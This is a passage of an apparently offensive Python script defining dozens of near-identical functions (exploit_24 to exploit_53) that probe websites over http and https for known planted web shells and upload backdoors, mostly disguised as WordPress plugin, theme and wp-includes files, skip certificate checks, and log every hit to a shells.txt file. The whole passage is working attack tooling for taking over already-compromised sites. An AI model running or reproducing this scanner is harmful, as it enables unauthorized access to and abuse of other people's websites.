        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/ccx/index.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Negat1ve Shell' in check.content.decode("utf-8"):
                    print (' [#] Exploit 23 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/ccx/index.php\n')
            else:
                print ('[#] Exploit 23 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_24(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/seoplugins/db.php?u',headers=headers, allow_redirects=True,timeout=15)
        if ('<input name="_upl" type="submit" id="_upl" value="Upload">' in check.content.decode("utf-8")):
                print (' [#] Exploit 24 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/seoplugins/db.php?u\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/seoplugins/db.php?u',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input name="_upl" type="submit" id="_upl" value="Upload">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 24 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/seoplugins/db.php?u\n')
            else:
                print ('[#] Exploit 24 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_25(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/index.php?3x=3x',headers=headers, allow_redirects=True,timeout=15)
        if ('<title>Upload files...</title>' in check.content.decode("utf-8")):
                print (' [#] Exploit 25 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/index.php?3x=3x\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/index.php?3x=3x',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<title>Upload files...</title>' in check.content.decode("utf-8"):
                    print (' [#] Exploit 25 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/index.php?3x=3x\n')
            else:
                print ('[#] Exploit 25 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_26(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/1.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<li class="form-upload">' in check.content.decode("utf-8")):
                print (' [#] Exploit 26 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/1.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/1.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<li class="form-upload">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 26 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/1.php\n')
            else:
                print ('[#] Exploit 26 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_27(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/radio.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 27 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/radio.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/radio.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 27 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/radio.php\n')
            else:
                print ('[#] Exploit 27 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_28(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/404.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 28 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/404.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/404.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 28 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/404.php\n')
            else:
                print ('[#] Exploit 28 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_29(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/ioptimization/IOptimize.php?rchk',headers=headers, allow_redirects=True,timeout=15)
        if ('ioptimization <input type="submit" value="Upload">' in check.content.decode("utf-8")):
                print (' [#] Exploit 29 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/ioptimization/IOptimize.php?rchk\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/ioptimization/IOptimize.php?rchk',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'ioptimization <input type="submit" value="Upload">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 29 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/ioptimization/IOptimize.php?rchk\n')
            else:
                print ('[#] Exploit 29 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_30(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/themes/pridmag/db.php?u',headers=headers, allow_redirects=True,timeout=15)
        if ('<input name="_upl" type="submit" id="_upl" value="Upload">' in check.content.decode("utf-8")):
                print (' [#] Exploit 30 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/themes/pridmag/db.php?u\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/themes/pridmag/db.php?u',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input name="_upl" type="submit" id="_upl" value="Upload">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 30 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/themes/pridmag/db.php?u\n')
            else:
                print ('[#] Exploit 30 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
#
#
#
#
#
#
def exploit_31(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/compat-ajax-response.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 31 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/compat-ajax-response.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/compat-ajax-response.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 31 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/compat-ajax-response.php\n')
            else:
                print ('[#] Exploit 31 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_32(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/feed-rss-meta.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 32 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/feed-rss-meta.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/feed-rss-meta.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 32 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/feed-rss-meta.php\n')
            else:
                print ('[#] Exploit 32 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_33(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/SimplePie/IRI-stream.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 33 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/SimplePie/IRI-stream.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/SimplePie/IRI-stream.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 33 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/SimplePie/IRI-stream.php\n')
            else:
                print ('[#] Exploit 33 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_34(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/class-walker-page-ajax-response.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 34 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/class-walker-page-ajax-response.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/class-walker-page-ajax-response.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 34 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/class-walker-page-ajax-response.php\n')
            else:
                print ('[#] Exploit 34 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_35(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/customize/class-wp-customize-filter-setting-ajax.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 35 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-filter-setting-ajax.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/customize/class-wp-customize-filter-setting-ajax.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 35 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-filter-setting-ajax.php\n')
            else:
                print ('[#] Exploit 35 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_36(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/https-detection-ajax.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 36 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/https-detection-ajax.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/https-detection-ajax.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 36 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/https-detection-ajax.php\n')
            else:
                print ('[#] Exploit 36 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_37(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/customize/class-wp-customize-header-image-control-stream.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 37 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-header-image-control-stream.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/customize/class-wp-customize-header-image-control-stream.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 37 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-header-image-control-stream.php\n')
            else:
                print ('[#] Exploit 37 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_38(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/customize/class-wp-customize-filter-setting-private.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 38 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-filter-setting-private.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/customize/class-wp-customize-filter-setting-private.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 38 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-filter-setting-private.php\n')
            else:
                print ('[#] Exploit 38 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_39(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/class-simplepie-ajax.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 39 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/class-simplepie-ajax.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/class-simplepie-ajax.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 39 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/class-simplepie-ajax.php\n')
            else:
                print ('[#] Exploit 39 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_40(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/class-wp-term-query-cron.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 40 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/class-wp-term-query-cron.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/class-wp-term-query-cron.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 40 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/class-wp-term-query-cron.php\n')
            else:
                print ('[#] Exploit 40 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_41(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/feed-rdf-stream.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 41 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/feed-rdf-stream.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/feed-rdf-stream.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 41 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/feed-rdf-stream.php\n')
            else:
                print ('[#] Exploit 41 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_42(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/class-wp-simplepie-sanitize-kses-stream.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 42 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/class-wp-simplepie-sanitize-kses-stream.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/class-wp-simplepie-sanitize-kses-stream.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 42 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/class-wp-simplepie-sanitize-kses-stream.php\n')
            else:
                print ('[#] Exploit 42 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_43(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/http-ajax-response.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 43 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/http-ajax-response.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/http-ajax-response.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 43 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/http-ajax-response.php\n')
            else:
                print ('[#] Exploit 43 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_44(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/customize/class-wp-customize-filter-setting-ajax.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 44 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-filter-setting-ajax.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/customize/class-wp-customize-filter-setting-ajax.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 44 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-filter-setting-ajax.php\n')
            else:
                print ('[#] Exploit 44 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_45(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/https-detection-ajax.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 45 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/https-detection-ajax.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/https-detection-ajax.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 45 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/https-detection-ajax.php\n')
            else:
                print ('[#] Exploit 45 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_46(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/customize/class-wp-customize-header-image-control-stream.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 46 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-header-image-control-stream.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'//wp-includes/customize/class-wp-customize-header-image-control-stream.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 46 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-header-image-control-stream.php\n')
            else:
                print ('[#] Exploit 46 z--> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
 

def exploit_47(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/customize/class-wp-customize-filter-setting-private.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 47 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-filter-setting-private.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/customize/class-wp-customize-filter-setting-private.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 47 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-filter-setting-private.php\n')
            else:
                print ('[#] Exploit 47 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_48(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/class-simplepie-ajax.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 48 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/class-simplepie-ajax.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/class-simplepie-ajax.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 48 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/class-simplepie-ajax.php\n')
            else:
                print ('[#] Exploit 48 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_49(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/class-wp-term-query-cron.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 49 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/class-wp-term-query-cron.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/class-wp-term-query-cron.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 49 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/class-wp-term-query-cron.php\n')
            else:
                print ('[#] Exploit 49 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_50(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/feed-rdf-stream.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 50 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/feed-rdf-stream.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/feed-rdf-stream.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 50 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/feed-rdf-stream.php\n')
            else:
                print ('[#] Exploit 50 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_51(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/class-wp-simplepie-sanitize-kses-stream.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 51 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/class-wp-simplepie-sanitize-kses-stream.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/class-wp-simplepie-sanitize-kses-stream.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 51 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/class-wp-simplepie-sanitize-kses-stream.php\n')
            else:
                print ('[#] Exploit 51 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_52(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/class-wp-tax-query-private.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 52 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/class-wp-tax-query-private.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/class-wp-tax-query-private.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 52 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/class-wp-tax-query-private.php\n')
            else:
                print ('[#] Exploit 52 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_53(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/class-wp-customize-widgets-ajax.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
